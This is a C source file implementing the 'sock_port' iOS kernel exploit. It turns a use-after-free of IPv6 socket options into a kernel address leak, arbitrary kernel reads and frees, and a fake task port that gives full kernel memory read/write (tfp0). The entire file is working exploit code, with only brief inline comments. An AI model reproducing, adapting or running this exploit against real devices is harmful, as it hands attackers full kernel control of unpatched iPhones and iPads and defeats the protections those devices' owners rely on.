#include "sock_port.h"
#include "KernelMemory.h"
#include "KernelOffsets.h"
#include <errno.h>
#include <iokit.h>
#include <mach/mach.h>
#include <netinet/in.h>
#include <sched.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/utsname.h>
#include <unistd.h>
#include "KernelUtilities.h"
#include "find_port.h"
#include "iosurface.h"
#include <pthread.h>

struct ool_msg {
    mach_msg_header_t hdr;
    mach_msg_body_t body;
    mach_msg_ool_ports_descriptor_t ool_ports;
};

struct simple_msg {
    mach_msg_header_t hdr;
    char buf[0];
};

typedef struct {
    mach_vm_address_t addr1;
    mach_vm_address_t addr2;
    mach_vm_address_t addr3;
    uint32_t id;
} surface_t;

#define IPV6_USE_MIN_MTU 42
#define IPV6_PKTINFO 46
#define IPV6_PREFER_TEMPADDR 63

struct route_in6 {
    struct rtentry* ro_rt;
    struct llentry* ro_lle;
    struct ifaddr* ro_srcia;
    uint32_t ro_flags;
    struct sockaddr_in6 ro_dst;
};

struct ip6po_rhinfo {
    struct ip6_rthdr* ip6po_rhi_rthdr; /* Routing header */
    struct route_in6 ip6po_rhi_route; /* Route to the 1st hop */
};

struct ip6po_nhinfo {
    struct sockaddr* ip6po_nhi_nexthop;
    struct route_in6 ip6po_nhi_route; /* Route to the nexthop */
};

struct ip6_pktopts {
    struct mbuf* ip6po_m;
    int ip6po_hlim;
    struct in6_pktinfo* ip6po_pktinfo;
    struct ip6po_nhinfo ip6po_nhinfo;
    struct ip6_hbh* ip6po_hbh;
    struct ip6_dest* ip6po_dest1;
    struct ip6po_rhinfo ip6po_rhinfo;
    struct ip6_dest* ip6po_dest2;
    int ip6po_tclass;
    int ip6po_minmtu;
    int ip6po_prefer_tempaddr;
    int ip6po_flags;
};

#define IO_BITS_ACTIVE 0x80000000
#define IOT_PORT 0
#define IKOT_TASK 2
#define IKOT_CLOCK 25
#define IKOT_IOKIT_CONNECT 29

typedef volatile struct {
    uint32_t ip_bits;
    uint32_t ip_references;
    struct {
        uint64_t data;
        uint64_t type;
    } ip_lock; // spinlock
    struct {
        struct {
            struct {
                uint32_t flags;
                uint32_t waitq_interlock;
                uint64_t waitq_set_id;
                uint64_t waitq_prepost_id;
                struct {
                    uint64_t next;
                    uint64_t prev;
                } waitq_queue;
            } waitq;
            uint64_t messages;
            uint32_t seqno;
            uint32_t receiver_name;
            uint16_t msgcount;
            uint16_t qlimit;
            uint32_t pad;
        } port;
        uint64_t klist;
    } ip_messages;
    uint64_t ip_receiver;
    uint64_t ip_kobject;
    uint64_t ip_nsrequest;
    uint64_t ip_pdrequest;
    uint64_t ip_requests;
    uint64_t ip_premsg;
    uint64_t ip_context;
    uint32_t ip_flags;
    uint32_t ip_mscount;
    uint32_t ip_srights;
    uint32_t ip_sorights;
} kport_t;

typedef struct {
    struct {
        uint64_t data;
        uint32_t reserved : 24,
            type : 8;
        uint32_t pad;
    } lock; // mutex lock
    uint32_t ref_count;
    uint32_t active;
    uint32_t halting;
    uint32_t pad;
    uint64_t map;
} ktask_t;

#define WQT_QUEUE 0x2
#define _EVENT_MASK_BITS ((sizeof(uint32_t) * 8) - 7)

union waitq_flags {
    struct {
        uint32_t /* flags */
            waitq_type : 2, /* only public field */
            waitq_fifo : 1, /* fifo wakeup policy? */
            waitq_prepost : 1, /* waitq supports prepost? */
            waitq_irq : 1, /* waitq requires interrupts disabled */
            waitq_isvalid : 1, /* waitq structure is valid */
            waitq_turnstile_or_port : 1, /* waitq is embedded in a turnstile (if irq safe), or port (if not irq safe) */
            waitq_eventmask : _EVENT_MASK_BITS;
    };
    uint32_t flags;
};

// From Ian Beer. Make a kernel allocation with the kernel address of 'target_port', 'count' times
static mach_port_t fill_kalloc_with_port_pointer(mach_port_t target_port, int count, int disposition)
{
    mach_port_t q = MACH_PORT_NULL;
    kern_return_t err;
    err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &q);
    if (err != KERN_SUCCESS) {
        LOG("failed to allocate port");
        return 0;
    }

    mach_port_t* ports = malloc(sizeof(mach_port_t) * count);
    for (int i = 0; i < count; i++) {
        ports[i] = target_port;
    }

    struct ool_msg* msg = (struct ool_msg*)calloc(1, sizeof(struct ool_msg));

    msg->hdr.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
    msg->hdr.msgh_size = (mach_msg_size_t)sizeof(struct ool_msg);
    msg->hdr.msgh_remote_port = q;
    msg->hdr.msgh_local_port = MACH_PORT_NULL;
    msg->hdr.msgh_id = 0x41414141;

    msg->body.msgh_descriptor_count = 1;

    msg->ool_ports.address = ports;
    msg->ool_ports.count = count;
    msg->ool_ports.deallocate = 0;
    msg->ool_ports.disposition = disposition;
    msg->ool_ports.type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
    msg->ool_ports.copy = MACH_MSG_PHYSICAL_COPY;

    err = mach_msg(&msg->hdr,
        MACH_SEND_MSG | MACH_MSG_OPTION_NONE,
        msg->hdr.msgh_size,
        0,
        MACH_PORT_NULL,
        MACH_MSG_TIMEOUT_NONE,
        MACH_PORT_NULL);

    if (err != KERN_SUCCESS) {
        LOG("failed to send message: %s", mach_error_string(err));
        return MACH_PORT_NULL;
    }

    return q;
}

// Utilities for manipulating sockets

static int set_minmtu(int sock, int* minmtu)
{
    return setsockopt(sock, IPPROTO_IPV6, IPV6_USE_MIN_MTU, minmtu, sizeof(*minmtu));
}

static int get_minmtu(int sock, int* minmtu)
{
    socklen_t size = sizeof(*minmtu);
    return getsockopt(sock, IPPROTO_IPV6, IPV6_USE_MIN_MTU, minmtu, &size);
}

static int get_prefertempaddr(int sock, int* prefertempaddr)
{
    socklen_t size = sizeof(*prefertempaddr);
    return getsockopt(sock, IPPROTO_IPV6, IPV6_PREFER_TEMPADDR, prefertempaddr, &size);
}

static int get_pktinfo(int sock, struct in6_pktinfo* pktinfo)
{
    socklen_t size = sizeof(*pktinfo);
    return getsockopt(sock, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo, &size);
}

static int set_pktinfo(int sock, struct in6_pktinfo* pktinfo)
{
    return setsockopt(sock, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo, sizeof(*pktinfo));
}

// free the pktopts struct of the socket to get ready for UAF
static int free_socket_options(int sock)
{
    return disconnectx(sock, 0, 0);
}

// return a socket we can UAF on
static int get_socket()
{
    int sock = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);
    if (sock < 0) {
        LOG("Can't get socket, error %d (%s)", errno, strerror(errno));
        return -1;
    }

    // allow setsockopt() after disconnect()
    struct so_np_extensions sonpx = { .npx_flags = SONPX_SETOPTSHUT, .npx_mask = SONPX_SETOPTSHUT };
    int ret = setsockopt(sock, SOL_SOCKET, SO_NP_EXTENSIONS, &sonpx, sizeof(sonpx));
    if (ret == -1) {
        LOG("setsockopt() failed, error %d (%s)", errno, strerror(errno));
        return -1;
    }

    return sock;
}

// return a socket ready for UAF
static int get_socket_with_dangling_options()
{
    int socket = get_socket();

    int minmtu = -1;
    set_minmtu(socket, &minmtu);

    free_socket_options(socket);

    return socket;
}

static mach_port_t new_port()
{
    mach_port_t port;
    kern_return_t rv = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
    if (rv) {
        LOG("Failed to allocate port (%s)", mach_error_string(rv));
        return MACH_PORT_NULL;
    }
    rv = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
    if (rv) {
        LOG("Failed to insert right (%s)", mach_error_string(rv));
        return MACH_PORT_NULL;
    }
    return port;
}

// first primitive: leak the kernel address of a mach port
static uint64_t find_port_via_uaf(mach_port_t port, int disposition)
{
    // here we use the uaf as an info leak
    int sock = get_socket_with_dangling_options();

    for (int i = 0; i < 0x10000; i++) {
        // since the UAFd field is 192 bytes, we need 192/sizeof(uint64_t) pointers
        mach_port_t p = fill_kalloc_with_port_pointer(port, 192 / sizeof(uint64_t), MACH_MSG_TYPE_COPY_SEND);

        int mtu;
        int pref;
        get_minmtu(sock, &mtu); // this is like doing ReadKernel32(options + 180);
        get_prefertempaddr(sock, &pref); // this like ReadKernel32(options + 184);

        // since we wrote 192/sizeof(uint64_t) pointers, reading like this would give us the second half of ReadKernel64(options + 184) and the fist half of ReadKernel64(options + 176)

        uint64_t ptr = (((uint64_t)mtu << 32) & 0xffffffff00000000) | ((uint64_t)pref & 0x00000000ffffffff);
        
        if (mtu >= 0xffffff00 && mtu != 0xffffffff && pref != 0xdeadbeef) {
            mach_port_destroy(mach_task_self(), p);
            close(sock);
            return ptr;
        }
        mach_port_destroy(mach_task_self(), p);
    }

    // close that socket.
    close(sock);
    return 0;
}

// Second primitive: read 20 bytes from addr
static void* read_20_via_uaf(uint64_t addr)
{

    int sockets[128];
    for (int i = 0; i < 128; i++) {
        sockets[i] = get_socket_with_dangling_options();
    }

    struct ip6_pktopts* fake_opts = calloc(1, sizeof(struct ip6_pktopts));
    fake_opts->ip6po_minmtu = 0x41424344;
    fake_opts->ip6po_pktinfo = (struct in6_pktinfo*)addr;

    bool found = false;
    int found_at = -1;

    for (int i = 0; i < 20; i++) {
        IOSurface_spray_with_gc(32, 256, (void*)fake_opts, (uint32_t)192, NULL);

        for (int j = 0; j < 128; j++) {
            int minmtu = -1;
            get_minmtu(sockets[j], &minmtu);
            if (minmtu == 0x41424344) {
                found_at = j;
                found = true;
                break;
            }
        }
        if (found)
            break;
    }

    SafeFreeNULL(fake_opts);

    for (int i = 0; i < 128; i++) {
        if (i != found_at) {
            close(sockets[i]);
        }
    }
    
    if (!found) {
        return 0;
    }

    void* buf = malloc(sizeof(struct in6_pktinfo));
    get_pktinfo(sockets[found_at], (struct in6_pktinfo*)buf);
    close(sockets[found_at]);

    return buf;
}

static uint64_t rk64_via_uaf(uint64_t addr)
{
    void* buf = read_20_via_uaf(addr);
    if (buf) {
        uint64_t r = *(uint64_t*)buf;
        SafeFreeNULL(buf);
        return r;
    }
    return 0;
}

static inline uint32_t mach_port_waitq_flags()
{
    union waitq_flags waitq_flags = {};
    waitq_flags.waitq_type = WQT_QUEUE;
    waitq_flags.waitq_fifo = 1;
    waitq_flags.waitq_prepost = 0;
    waitq_flags.waitq_irq = 0;
    waitq_flags.waitq_isvalid = 1;
    waitq_flags.waitq_turnstile_or_port = 1;
    return waitq_flags.flags;
}

static int free_via_uaf(uint64_t addr) {
    // Create a bunch of sockets
    int sockets[128];
    for (int i = 0; i < 128; i++) {
        sockets[i] = get_socket_with_dangling_options();
    }
    
    // Create a fake struct with our dangling port address as its pktinfo
    struct ip6_pktopts *fake_opts = calloc(1, sizeof(struct ip6_pktopts));
    fake_opts->ip6po_minmtu = 0x41424344; // give a number we can recognize
    fake_opts->ip6po_pktinfo = (struct in6_pktinfo*)addr;
    
    bool found = false;
    int found_at = -1;
    
    for (int i = 0; i < 20; i++) { // Iterate through the sockets to find if we overwrote one
        IOSurface_spray_with_gc(32, 256, (void*)fake_opts, (uint32_t)sizeof(struct ip6_pktopts), NULL);
        
        for (int j = 0; j < 128; j++) {
            int minmtu = -1;
            get_minmtu(sockets[j], &minmtu);
            if (minmtu == 0x41424344) { // Found it!
                found_at = j; // Save its index
                found = true;
                break;
            }
        }
        if (found) break;
    }
    
    SafeFreeNULL(fake_opts);
    
    if (!found) {
        LOG("Unable to setup freeing primitive.");
        return -1;
    }
    
    for (int i = 0; i < 128; i++) {
        if (i != found_at) {
            close(sockets[i]);
        }
    }
    struct in6_pktinfo *buf = malloc(sizeof(struct in6_pktinfo));
    memset(buf, 0, sizeof(struct in6_pktinfo));
    
    int ret = set_pktinfo(sockets[found_at], buf);
    SafeFreeNULL(buf);
    return ret;
}

bool sock_port(void)
{
    bool ret = false;
    uint64_t self_port_addr = 0;
    uint64_t ipc_space_kernel = 0;
    kern_return_t kr = KERN_FAILURE;
    mach_port_t *pre_ports = NULL;
    uint8_t* smaller_body = NULL;
    uint8_t* body = NULL;
    int fds[2];
    uint8_t pipebuf[0x10000];
    int port_fds[2];
    kport_t *fakeport = NULL;
    ktask_t *fake_task = NULL;
    uint64_t task = 0;
    uint64_t proc = 0;
    uint64_t itk_space = 0;
    uint64_t is_table = 0;
    uint64_t p_fd = 0;
    uint64_t fd_ofiles = 0;
    uint64_t fproc = 0;
    uint64_t f_fglob = 0;
    uint64_t fg_data = 0;
    uint64_t pipe_buffer = 0;
    uint64_t port_fg_data = 0;
    uint64_t port_pipe_buffer = 0;
    mach_port_t target = MACH_PORT_NULL;
    uint64_t target_addr = 0;
    mach_port_t port = MACH_PORT_NULL;
    struct ool_msg *msg = NULL;
    mach_port_t *received_ports = NULL;
    mach_port_t our_port = MACH_PORT_NULL;
    uint64_t* read_addr_ptr = NULL;
    uint64_t struct_task = 0;
    bool has_smap = true;
    struct utsname u = { 0 };
    
    if (uname(&u) != 0) {
        LOG("uname: %s", strerror(errno));
        goto out;
    }
    
    has_smap &= (vm_kernel_page_size == 0x4000);
    has_smap &= (strncmp(u.machine, "iPad5,", strlen("iPad5,")) != 0);
    has_smap &= (strncmp(u.machine, "iPad6,", strlen("iPad6,")) != 0);
    has_smap &= (strncmp(u.machine, "iPhone8,", strlen("iPhone8,")) != 0);
    
    // Initialize IOSurface
    if (!IOSurface_init()) {
        LOG("Unable to initialize IOSurface.");
        goto out;
    }
    
#define _krnreadport(val, port) do { \
    for (int i = 0; i < 10000; i++) { \
        val = find_port_via_uaf(port, MACH_MSG_TYPE_COPY_SEND); \
        if (KERN_POINTER_VALID(val)) break; \
        usleep(100); \
    } \
    if (KERN_POINTER_VALID(val)) break; \
    LOG("Unable to read %s: 0x%llx", #port, val); \
    goto out; \
} while(false)
#define _krnfree(kptr) do { \
    int rv = 0; \
    for (int i = 0; i < 10000; i++) { \
        rv = free_via_uaf(kptr); \
        if (rv == 0) break; \
        usleep(100); \
    } \
    if (rv == 0) break; \
    LOG("Unable to free %s: %d", #kptr, rv); \
    goto out; \
} while(false)
#define _krnread64(val, kptr) do { \
    for (int i = 0; i < 10000; i++) { \
        val = rk64_via_uaf(kptr); \
        if (KERN_POINTER_VALID(val)) break; \
        usleep(100); \
    } \
    if (KERN_POINTER_VALID(val)) break; \
    LOG("Unable to read %s: 0x%llx", #val, kptr); \
    goto out; \
} while(false) \

    // Setup first primitives
    extern uint64_t cached_task_self_addr;
    _krnreadport(self_port_addr, mach_task_self());
    cached_task_self_addr = self_port_addr;

    _krnread64(ipc_space_kernel, self_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER));

    if (pipe(fds) != 0) {
        LOG("pipe: %s", strerror(errno));
        goto out;
    }
    
    memset(pipebuf, 0, 0x10000);
    write(fds[1], pipebuf, 0x10000);
    read(fds[0], pipebuf, 0x10000);
    write(fds[1], pipebuf, 8);
    
    if (has_smap && pipe(port_fds) != 0) {
        LOG("pipe: %s", strerror(errno));
        goto out;
    }

    // Setup fake port

    fakeport = malloc(sizeof(kport_t) + 0x600);
    assert(fakeport != NULL);
    fake_task = (ktask_t *)((uint64_t)fakeport + sizeof(kport_t));
    bzero((void *)fakeport, sizeof(kport_t) + 0x600);
    
    fake_task->ref_count = 0xff;

    fakeport->ip_bits = IO_BITS_ACTIVE | IKOT_TASK;
    fakeport->ip_references = 0xd00d;
    fakeport->ip_lock.type = 0x11;
    fakeport->ip_messages.port.receiver_name = 1;
    fakeport->ip_messages.port.msgcount = 0;
    fakeport->ip_messages.port.qlimit = MACH_PORT_QLIMIT_LARGE;
    fakeport->ip_messages.port.waitq.flags = mach_port_waitq_flags();
    fakeport->ip_srights = 99;
    fakeport->ip_kobject = 0;
    fakeport->ip_receiver = ipc_space_kernel;
    
    if (has_smap) {
        write(port_fds[1], (void *)fakeport, sizeof(kport_t) + 0x600);
        read(port_fds[0], (void *)fakeport, sizeof(kport_t) + 0x600);
    }
    
    _krnread64(task, self_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
    _krnread64(proc, task + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
    cached_proc_struct_addr = proc;
    _krnread64(p_fd, proc + koffset(KSTRUCT_OFFSET_PROC_P_FD));
    _krnread64(fd_ofiles, p_fd + 0);
    _krnread64(fproc, fd_ofiles + fds[0] * 8);
    _krnread64(f_fglob, fproc + 8);
    _krnread64(fg_data, f_fglob + 56);
    _krnread64(pipe_buffer, fg_data + 16);
    if (has_smap) {
        _krnread64(fproc, fd_ofiles + port_fds[0] * 8);
        _krnread64(f_fglob, fproc + 8);
        _krnread64(port_fg_data, f_fglob + 56);
        _krnread64(port_pipe_buffer, port_fg_data + 16);
        fakeport->ip_kobject = port_pipe_buffer + sizeof(kport_t);
        write(port_fds[1], (void *)fakeport, sizeof(kport_t) + 0x600);
    } else {
        fakeport->ip_kobject = (uint64_t)fake_task;
    }
    
    target = new_port();
    if (!MACH_PORT_VALID(target)) {
        LOG("Unable to allocate target port.");
        goto out;
    }
    
    _krnreadport(target_addr, target);
    _krnfree(pipe_buffer);
    
    for (int i = 0; i < 100; i++) {
        port = fill_kalloc_with_port_pointer(target, 0x10000/8, MACH_MSG_TYPE_COPY_SEND);
        uint64_t addr;
        read(fds[0], &addr, 8);
        if (addr == target_addr) break;
        write(fds[1], &addr, 8);
        mach_port_destroy(mach_task_self(), port);
        port = MACH_PORT_NULL;
    }
    if (!MACH_PORT_VALID(port)) {
        LOG("Unable to spray.");
        goto out;
    }
    
    write(fds[1], (has_smap ? (const void *)&port_pipe_buffer : (const void *)&fakeport), 8);
    
    msg = calloc(1, 0x1000);
    assert(msg != NULL);
    
    kr = mach_msg(&msg->hdr, MACH_RCV_MSG, 0, 0x1000, port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    if (kr != KERN_SUCCESS) {
        LOG("mach_msg: %s", mach_error_string(kr));
        goto out;
    }
    
    received_ports = msg->ool_ports.address;
    our_port = received_ports[0];

    read_addr_ptr = (uint64_t*)((uint64_t)fake_task + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
    
#undef _krnread64
    
#define _krnread32(val, kptr) do { \
    if (has_smap) read(port_fds[0], (void *)fakeport, sizeof(kport_t) + 0x600);\
    *read_addr_ptr = kptr - koffset(KSTRUCT_OFFSET_PROC_PID); \
    if (has_smap) write(port_fds[1], (void *)fakeport, sizeof(kport_t) + 0x600); \
    val = 0x0; \
    kr = pid_for_task(our_port, (int *)&val); \
    if (kr != KERN_SUCCESS) { \
        LOG("pid_for_task: %s", mach_error_string(kr)); \
        goto out; \
    } \
} while(false)
    
#define _krnread64(val, kptr) do { \
    uint32_t read_val = 0; \
    _krnread32(read_val, kptr + 0x4); \
    _krnread32(val, kptr); \
    val = val | ((uint64_t)read_val << 32); \
    if (KERN_POINTER_VALID(val)) break; \
    LOG("Unable to read %s: 0x%llx", #val, kptr); \
    goto out;\
} while(false)
    
    _krnread64(struct_task, self_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
    
    // Get TFP0

    uint64_t kernel_vm_map = 0;

    while (struct_task != 0) {
        uint64_t bsd_info = 0;
        uint32_t pid = 0;
        _krnread64(bsd_info, struct_task + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
        _krnread32(pid, bsd_info + koffset(KSTRUCT_OFFSET_PROC_PID));
        if (pid == 0) {
            _krnread64(kernel_vm_map, struct_task + koffset(KSTRUCT_OFFSET_TASK_VM_MAP));
            break;
        }
        _krnread64(struct_task, struct_task + koffset(KSTRUCT_OFFSET_TASK_PREV));
    }
    _krnread64(itk_space, task + koffset(KSTRUCT_OFFSET_TASK_ITK_SPACE));
    _krnread64(is_table, itk_space + koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE));
    
    read(port_fds[0], (void *)fakeport, sizeof(kport_t) + 0x600);

    fake_task->lock.data = 0x0;
    fake_task->lock.type = 0x22;
    fake_task->ref_count = 100;
    fake_task->active = 1;
    fake_task->map = kernel_vm_map;
    *(uint32_t*)((uint64_t)fake_task + 0xd8) = 1;
    
    if (has_smap) write(port_fds[1], (void *)fakeport, sizeof(kport_t) + 0x600);

    prepare_for_rw_with_fake_tfp0(our_port);
    
    if (!verify_tfp0()) {
        LOG("Unable to verify early TFP0.");
        goto out;
    }

    mach_port_t new_tfp0 = new_port();
    if (!MACH_PORT_VALID(new_tfp0)) {
        LOG("Unable to allocate new TFP0.");
        goto out;
    }

    uint64_t new_addr = find_port_address(new_tfp0, MACH_MSG_TYPE_MAKE_SEND);
    if (!new_addr) {
        LOG("Unable to find kernel memory address for new TFP0.");
        goto out;
    }

    uint64_t faketask = kmem_alloc(0x600);
    if (!KERN_POINTER_VALID(faketask)) {
        LOG("Unable to allocate kernel memory for fake_task.");
        goto out;
    }

    kwrite(faketask, fake_task, 0x600);
    fakeport->ip_kobject = faketask;

    kwrite(new_addr, (const void*)fakeport, sizeof(kport_t));
    
    prepare_for_rw_with_fake_tfp0(new_tfp0);
    
    if (!verify_tfp0()) {
        LOG("Unable to verify new TFP0.");
        goto out;
    }
    
    WriteKernel32(is_table + (MACH_PORT_INDEX(our_port) * koffset(KSTRUCT_SIZE_IPC_ENTRY)) + sizeof(uint64_t), 0);
    WriteKernel64(is_table + (MACH_PORT_INDEX(our_port) * koffset(KSTRUCT_SIZE_IPC_ENTRY)), 0);
    WriteKernel64(fg_data + sizeof(uint64_t) * 2, 0);
    
    ret = true;
out:;
    if (fds[0] > 0) close(fds[0]);
    if (fds[1] > 0) close(fds[1]);
    if (port_fds[0] > 0) close(port_fds[0]);
    if (port_fds[1] > 0) close(port_fds[1]);
    SafeFree((void *)fakeport);
    SafeFreeNULL(msg);
    SafeFreeNULL(pre_ports);
    SafeFreeNULL(smaller_body);
    SafeFreeNULL(body);
    IOSurface_deinit();
    return ret;
}
